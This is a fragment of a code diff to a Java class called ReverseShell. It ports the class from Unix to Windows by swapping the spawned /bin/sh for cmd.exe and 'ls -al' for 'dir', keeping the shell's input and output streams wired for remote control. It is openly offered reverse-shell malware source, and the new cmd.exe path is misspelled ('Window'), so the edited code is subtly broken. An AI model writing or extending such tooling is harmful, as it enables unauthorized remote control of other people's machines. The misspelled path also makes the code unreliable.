@@ -23,7 +23,7 @@ class ReverseShell implements Runnable{
 		
 		try{
 			Runtime rt = Runtime.getRuntime();
-			Process p = rt.exec("/bin/sh");
+			Process p = rt.exec("C:\\Window\\System32\\cmd.exe");
 			
 			InputStream readme = p.getInputStream();
 			OutputStream writeme = p.getOutputStream();
@@ -31,7 +31,7 @@ class ReverseShell implements Runnable{
 			commandRead = new BufferedReader(new InputStreamReader(readme));
 			
 			
-			commandWrite.println("ls -al");
+			commandWrite.println("dir");
 			commandWrite.flush();
 
 			String line;
